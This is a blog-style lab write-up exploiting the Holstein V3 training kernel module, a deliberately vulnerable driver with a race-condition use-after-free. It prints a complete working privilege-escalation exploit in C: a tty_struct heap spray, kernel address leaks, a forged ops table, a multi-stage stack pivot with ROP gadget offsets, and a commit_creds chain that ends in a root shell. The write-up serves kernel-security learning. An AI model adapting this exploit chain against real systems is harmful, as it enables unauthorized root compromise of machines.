---
layout: page
title: "Linux Kernel - HolsteinV3"
nav_order: 1
permalink: /linux-kernel/HolsteinV3
---

# Background
Holstein is a series of vulnerable (linux) kernel modules used as a learning material in [PAWNYABLE](https://pawnyable.cafe/), V3 is the third module in the series containing a UAF vulnerability.

## Mitigations
Looking at the qemu run script:

![Pasted image 20230916001918](https://github.com/0xAriana/blog/assets/121199478/a0e32db2-d547-41af-af7a-99228acce6b4)

We can see everything is enabled:
* SMAP
* SMEP
* PTI
* KASLR
# Source code analysis

```c

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("Holstein v3 - Vulnerable Kernel Driver for Pawnyable");

#define DEVICE_NAME "holstein"
#define BUFFER_SIZE 0x400

char *g_buf = NULL;

static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}

static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}

static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}

static struct file_operations module_fops =
  {
   .owner   = THIS_MODULE,
   .read    = module_read,
   .write   = module_write,
   .open    = module_open,
   .release = module_close,
  };

static dev_t dev_id;
static struct cdev c_dev;

static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
    printk(KERN_WARNING "Failed to register device\n");
    return -EBUSY;
  }

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    printk(KERN_WARNING "Failed to add cdev\n");
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}

static void __exit module_cleanup(void)
{
  cdev_del(&c_dev);
  unregister_chrdev_region(dev_id, 1);
}

module_init(module_initialize);
module_exit(module_cleanup);

```

We got a pretty simple driver, when we open the device, a chunk of 0x400 is being allocated and a pointer to it is being saved to a global `g_buf`.
We also get to read and write a max of 0x400 bytes into the allocated chunk.
The chunk is being freed when the module is released - when the last holder of the file descriptor closes it.

## Vulnerability
The vulnerability is a UAF which is caused by a race condition on releasing the module:
1. If the last hold of the file descriptor closes it, `module_close` is called - thread 1.
2. Context switch occurs to another thread (thread 2), which opens a handle to the module, allocating a new chunk.
3. Context switch happens again back to thread 1, which frees the freshly allocated chunk.
4. We got a dangling pointer to a freed chunk using the fd in thread 2.

# Exploit
## Triggering the race
Lets look on the following code:
```c

bool stop_running = false;

void *race_thread() {
    while (!stop_running) {
        int fd;
        if (!(fd = open("/dev/holstein", O_RDWR))) {
            printf("open worker_thread failed!");
            exit(1);

        }
        close(fd);
    }
    return NULL;
}


int main() {

    pthread_t thr;
    pthread_create(&thr, NULL, reinterpret_cast<void *(*)(void *)>(race_thread), NULL);

    while (true) {
        int fd;
        if (!(fd = open("/dev/holstein", O_RDWR))) {
            printf("open main failed!");
            exit(1);
        }
        int ptmx[0x100] = {0};
        char leak_buff[0x400] = {0};

        for (int i = 0; i < 0x100; ++i) {
            ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        }
        read(fd, leak_buff, 0x400);
        printf("%16lx\n", *(unsigned long *) leak_buff);

        for (int i = 0; i < 0x100; ++i) {
            close(ptmx[i]);
        }
        close(fd);
    }

    return 0;
}
```

Main invokes a `race_thread`, which periodically opens and closes the `holstein` device, triggering `module_open`, and possibly `module_close`.
The main thread then sprays the 1024-slab with `tty_struct` objects by opening `/dev/ptmx`, more on this struct can be found [here](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628#tty_struct).
The main also tries to read the content of `gbuf`, which should be zeroed since it was allocated using `kzalloc`, but - if the race succeeded, 
it was freed after the allocation by the `race_thread`, and then re-allocated to the sprayed `tty_struct`.
So, when we print it, if we won the race, we should see non-zeros:
![Pasted image 20230915103800](https://github.com/0xAriana/blog/assets/121199478/f3046ecc-7a15-4837-934d-33d9dc074652)

As we can see, in 2 cases of the loop, we printed 0x5401 which corresponds to a magic of `tty_struct.

`tty_struct` definition for kernel 5.16.14 can be found [here](https://elixir.bootlin.com/linux/v5.16.14/source/include/linux/tty.h#L143)
```c

struct tty_struct {
	int	magic;
	struct kref kref;
	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;

	/* Protects ldisc changes: Lock tty not pty */
	struct ld_semaphore ldisc_sem;
	struct tty_ldisc *ldisc;

	struct mutex atomic_write_lock;
	struct mutex legacy_mutex;
	struct mutex throttle_mutex;
	struct rw_semaphore termios_rwsem;
	struct mutex winsize_mutex;
	/* Termios values are protected by the termios rwsem */
	struct ktermios termios, termios_locked;
	char name[64];
	unsigned long flags;
	int count;
	struct winsize winsize;		/* winsize_mutex */

	struct {
		spinlock_t lock;
		bool stopped;
		bool tco_stopped;
		unsigned long unused[0];
	} __aligned(sizeof(unsigned long)) flow;

	struct {
		spinlock_t lock;
		struct pid *pgrp;
		struct pid *session;
		unsigned char pktstatus;
		bool packet;
		unsigned long unused[0];
	} __aligned(sizeof(unsigned long)) ctrl;

	int hw_stopped;
	unsigned int receive_room;	/* Bytes free for queue */
	int flow_change;

	struct tty_struct *link;
	struct fasync_struct *fasync;
	wait_queue_head_t write_wait;
	wait_queue_head_t read_wait;
	struct work_struct hangup_work;
	void *disc_data;
	void *driver_data;
	spinlock_t files_lock;		/* protects tty_files list */
	struct list_head tty_files;

#define N_TTY_BUF_SIZE 4096

	int closing;
	unsigned char *write_buf;
	int write_cnt;
	/* If the tty has a pending do_SAK, queue it here - akpm */
	struct work_struct SAK_work;
	struct tty_port *port;
} __randomize_layout;

/* Each of a tty's open files has private_data pointing to tty_file_private */
struct tty_file_private {
	struct tty_struct *tty;
	struct file *file;
	struct list_head list;
};

/* tty magic number */
#define TTY_MAGIC		0x5401
```


## Leaking ASLR and heap placement
Since we have a handle to a `tty_struct`, and the `holstein` driver allows us to read into it, let's see if reading the struct can be useful:
![Pasted image 20230916004522](https://github.com/0xAriana/blog/assets/121199478/888e852c-8565-4125-883f-e91032684bed)

We note the following:
* The `ops` pointer is at offset 0x18 - pointing to the kernel `rodata` section -> we can deduce the kernel base.
* At offset 0x70, the struct point to itself - meaning, if we read this address - we know the address of the UAF `tty_struct` on the heap!
* At the end of the struct, there are 0x148 of "empty" bytes (all zeros) - remember those for later.
## Getting code execution
As we can see the `tty_struct` has a `ops` pointer, which point to the following struct:

```c

struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	unsigned int (*write_room)(struct tty_struct *tty);
	unsigned int (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
	int  (*get_serial)(struct tty_struct *tty, struct serial_struct *p);
	int  (*set_serial)(struct tty_struct *tty, struct serial_struct *p);
	void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
	int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;

```
It's a table of function pointers that get used by the `tty` driver (similar to other drivers fops).
So if we overwrite the `ops` pointer to an attacker controlled structure, we can trigger a function pointer by doing some actions on the `tty` device (read/write are the trivial ones).

## Function pointer to privilege escalation
Running a single function using the crafted `ops` is nice, but running a single gadget is not enough to escalate to root.
The solution is to use that single gadget to stack pivot to a controlled region, and then running ROP in order to:
1. Escalating to root.
2. Returning to user space.
In user space we will later on pop a shell using `execve`.

### Stack pivot - stage 1
Let's look at the context at which `ops->write` is being called:

![Pasted image 20230916003325](https://github.com/0xAriana/blog/assets/121199478/ead750c4-4c27-4ee4-ac29-eeb506d8fa3d)
![Pasted image 20230916003309](https://github.com/0xAriana/blog/assets/121199478/8ebdb32e-f5e2-46b6-a0ce-c51eb4b6e5b5)

We notice that when write is called, `rdi` points to the UAF `tty_struct`, so, if we find a gadget that sets `rsp` to `rdi`, we actually control the content of the stack.
I used [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) to extract the `bzImage` into an elf which [ropper](https://github.com/sashs/Ropper) can digest, and found the following gadget:
![Pasted image 20230916003621](https://github.com/0xAriana/blog/assets/121199478/7c89bdd5-97c2-4058-9985-0f45107d6206)

We can also see that after the stack is being pivoted, we pop another two registers (`r13`, `rbp`) from the `tty_struct`, meaning our struct now pointers to offset 0x10 in the `tty_struct`, just one qword before the `ops`,
which we cannot overwrite - so even after pivoting, we only get 1 gadget to use.

To use the gadget, I crafted a fake `ops` table (containing 14 functions - all the same address), at the end of the `tty_struct` (unpopulated space), and wrote a pointer to it at the `ops` offset 0x18:

![Pasted image 20230916005756](https://github.com/0xAriana/blog/assets/121199478/21c84ffa-5e90-425e-a2e0-1607255b4f81)
![Pasted image 20230916005818](https://github.com/0xAriana/blog/assets/121199478/466424f7-6c2f-4197-bbaa-0cff57be8448)

I trigger the write callback by calling `write` to all the opened `tty_struct` file descriptors from the spraying phase:

```c

    for (int i = 0; i < 0x100; ++i) {
        write(ptmx[i], dummy_buff, sizeof(dummy_buff));
    }
```
### Stack pivot - stage 2
One might think that we actually didn't gain anything, since we pivoted only to find we are again able to run just a single gadget.
However, context matters, this time, `rsp` is much more convenient, since it's already pointing to a struct which we control.
I wanted to use this gadget to pivot to the end of the struct (empty place we found in [[#Leaking ASLR and heap placement]]), but the pivot gadgets weren't good enough, best I could do is:

![Pasted image 20230916004232](https://github.com/0xAriana/blog/assets/121199478/0ef20a08-e1c4-47a4-a6b5-294fe15f5ab1)

This will set `rsp` to offset 0x40 within the `tty_struct`.

This gadget is placed at offset 0x10 in the `tty_struct`, since this is where the stack relies after the stage 1:

![Pasted image 20230916010214](https://github.com/0xAriana/blog/assets/121199478/671f9bba-e62d-4339-a678-778d5034d05a)

### Stack pivot - stage 3
At this offset we can allow ourselves to write more then one gadget, possible all of them, but since this part of the structure is populated with data, I preferred to pivot again, this time, to the empty place at the end of the `tty_struct`.
This time, I used a single gadget, but with data succeeding it:

![Pasted image 20230916003325](https://github.com/0xAriana/blog/assets/121199478/843b9b02-4326-46df-9539-15b732bae6ca)

The data I placed is where I want to pivot to - the address of the end of the struct, can be seen here:

![Pasted image 20230916005334](https://github.com/0xAriana/blog/assets/121199478/cc0ea1af-2dec-401e-8452-aeba122002f2)

After this, `rsp` will point to offset 0x320 within the `tty_struct`.


## PE Rop and returning to user space
This part is pretty standard:
1. We call `prepare_kernel_creds` with null as an argument
2. Pass the result to `commit_creds` to get root privileges to the current task.
3. Call [swapgs_restore_regs_and_return_to_usermode](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/entry/entry_64.S) with the return user space context ready on the stack: RIP, CS, EFLAGS, RSP, SS.

* At the beginning of main, I've set the context I want to return to in the function `setup_iretq_context`:

```c

unsigned long cs;
unsigned long ss;
unsigned long rip = (unsigned long) &execve_bin_bash;
unsigned long flags;
unsigned long rsp;

void execve_bin_bash() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

void setup_iretq_context() {
    asm volatile("mov %%cs, %0" : "=m" (cs));
    asm volatile("mov %%ss, %0" : "=m" (ss));
    asm volatile("pushfq; pop %0" : "=m" (flags));
    asm volatile("mov %%rsp, %0" : "=m" (rsp));
};
```

The Rop looks something like this:

```c
    unsigned long pe_and_ret_to_userspace_rop[] = {pop_rdi_address, 0, prepare_kernel_creds_f,
                                                   xchg_rdi_rax_address,
                                                   commit_creds_f, swapgs_restore_regs_and_return_to_usermode_address, rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500, rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500 + 0x400, rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500, rip, cs, flags, rsp, ss};
```
`rsp + 0x500` is just a writeable place that is being loaded to the registers in `swapgs_restore_regs_and_return_to_usermode`.

## Putting it all together
Here's the final code:

```c

#include <stdio.h>
#include <fcntl.h>
#include <cstdlib>
#include <unistd.h>
#include <sys/mman.h>
#include <thread>
#include <semaphore.h>

void execve_bin_bash() {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

unsigned long cs;
unsigned long ss;
unsigned long rip = (unsigned long) &execve_bin_bash;
unsigned long flags;
unsigned long rsp;

void setup_iretq_context() {
    asm volatile("mov %%cs, %0" : "=m" (cs));
    asm volatile("mov %%ss, %0" : "=m" (ss));
    asm volatile("pushfq; pop %0" : "=m" (flags));
    asm volatile("mov %%rsp, %0" : "=m" (rsp));
};

sem_t mutex;

void *worker_thread() {
    while (true) {
        int fd;
        if (!(fd = open("/dev/holstein", O_RDWR))) {
            printf("open worker_thread failed!");
            exit(1);

        }
        close(fd);
        sem_wait(&mutex);
    }
}


int main() {
    sem_init(&mutex, 0, 0);

    setup_iretq_context();

    pthread_t thr;
    pthread_create(&thr, NULL, reinterpret_cast<void *(*)(void *)>(worker_thread), NULL);
    int ptmx[0x100] = {0};
    char leak_buff[0x400] = {0};
    char dummy_buff[0x10];
    int fd;

    while (true) {
        if (!(fd = open("/dev/holstein", O_RDWR))) {
            printf("open main failed!");
            exit(1);
        }

        for (int i = 0; i < 0x100; ++i) {
            ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        }

        read(fd, leak_buff, sizeof(leak_buff));

        if (*(unsigned int *) leak_buff == 0x5401) {
            break;
        }

        for (int i = 0; i < 0x100; ++i) {
            close(ptmx[i]);
        }

        close(fd);
        sem_post(&mutex);
    }

    // Race won.

    printf("Race won, gbuf now points to a tty_struct\n");


    unsigned long leaked_addr = *(unsigned long *) &leak_buff[24];
    unsigned long leaked_addr_offset = 0xc39c60;
    unsigned long kernel_base = leaked_addr - leaked_addr_offset;

    unsigned long leak_tty_struct_obj_address = (*(unsigned long *) &leak_buff[0x70] - 0x70);

    printf("Leaked kernel base:%16lx\n", kernel_base);
    printf("Leaked tty_struct obj address:%16lx\n", leak_tty_struct_obj_address);

    unsigned long stack_pivot_stage_1_gadget_offset = 0x529205; // push rdi; add eax, 0x415bffbe; pop rsp; pop r13; pop rbp; ret;
    unsigned long stack_pivot_gadget_stage_1_address = kernel_base + stack_pivot_stage_1_gadget_offset;

    unsigned long stack_pivot_stage_2_gadget_offset = 0x2a14b9; // add rsp, 0x28; ret;
    unsigned long stack_pivot_gadget_stage_2_address = kernel_base + stack_pivot_stage_2_gadget_offset;
    *(unsigned long *) &leak_buff[2 *
                                  sizeof(void *)] = stack_pivot_gadget_stage_2_address; // one field before the fops pointer.




    unsigned long struct_empty_place_off = 696;
    unsigned long used_space = 0;
    unsigned long struct_empty_place_address = leak_tty_struct_obj_address + struct_empty_place_off;
    unsigned long num_of_func_pointers_to_write = 14;

    for (int i = 0; i < num_of_func_pointers_to_write; i++) {
        *(unsigned long *) &leak_buff[struct_empty_place_off + i * 8] = stack_pivot_gadget_stage_1_address;
    }

    used_space += sizeof(stack_pivot_gadget_stage_1_address) * num_of_func_pointers_to_write;

    unsigned long tty_operations_offset = 3 * sizeof(void *); // it's the 4th qword.
    *(unsigned long *) &leak_buff[tty_operations_offset] = struct_empty_place_address;

    unsigned long stack_pivot_stage_3_gadget_offset = 0x001821; // pop rsp; pop rbp; ret;
    unsigned long stack_pivot_gadget_stage_3_address = kernel_base + stack_pivot_stage_3_gadget_offset;


    unsigned long prepare_kernel_creds_f_off = 0x072560;
    unsigned long prepare_kernel_creds_f = kernel_base + prepare_kernel_creds_f_off;

    unsigned long pop_rdi_off = 0x14078a;
    unsigned long pop_rdi_address = kernel_base + pop_rdi_off;

    unsigned long xchg_rdi_rax_off = 0x487980;
    unsigned long xchg_rdi_rax_address = kernel_base + xchg_rdi_rax_off;

    unsigned long commit_creds_f_off = 0x0723c0;
    unsigned long commit_creds_f = kernel_base + commit_creds_f_off;


    unsigned long swapgs_restore_regs_and_return_to_usermode_offset = 0x800e10;
    unsigned long swapgs_restore_regs_and_return_to_usermode_address =
            kernel_base + swapgs_restore_regs_and_return_to_usermode_offset;

    unsigned long stage_3_rop_off = 0x10 + 0x30;

    unsigned long stage_3_rop[] = {stack_pivot_gadget_stage_3_address, struct_empty_place_address + used_space - 0x8};


    for (int j = 0; j < sizeof(stage_3_rop) / 8; j++) {
        *((unsigned long *) &leak_buff[stage_3_rop_off + j * 8]) = stage_3_rop[j];
    }

    // Now write the final rop to where the third stage of stack pivot moved the stack to.
    unsigned long pe_and_ret_to_userspace_rop[] = {pop_rdi_address, 0, prepare_kernel_creds_f,
                                                   xchg_rdi_rax_address,
                                                   commit_creds_f, swapgs_restore_regs_and_return_to_usermode_address,
                                                   rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500, rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500 + 0x400, rsp + 0x500, rsp + 0x500,
                                                   rsp + 0x500,
                                                   rsp + 0x500, rsp + 0x500, rip, cs, flags, rsp, ss};


    for (int j = 0; j < sizeof(pe_and_ret_to_userspace_rop) / 8; j++) {
        *((unsigned long *) &leak_buff[struct_empty_place_off + used_space + j * 8]) = pe_and_ret_to_userspace_rop[j];
    }


    // Overwrite the tty_struct with the modified version.
    write(fd, leak_buff, sizeof(leak_buff));

    // Trigger the overwrote function pointer in one of those objects.
    for (int i = 0; i < 0x100; ++i) {
        write(ptmx[i], dummy_buff, sizeof(dummy_buff));
    }

    sem_destroy(&mutex);

    return 0;
}
```

And the result is:

![Pasted image 20230915232757](https://github.com/0xAriana/blog/assets/121199478/0f53e733-2534-42f0-b7c9-d743d17b95b6)
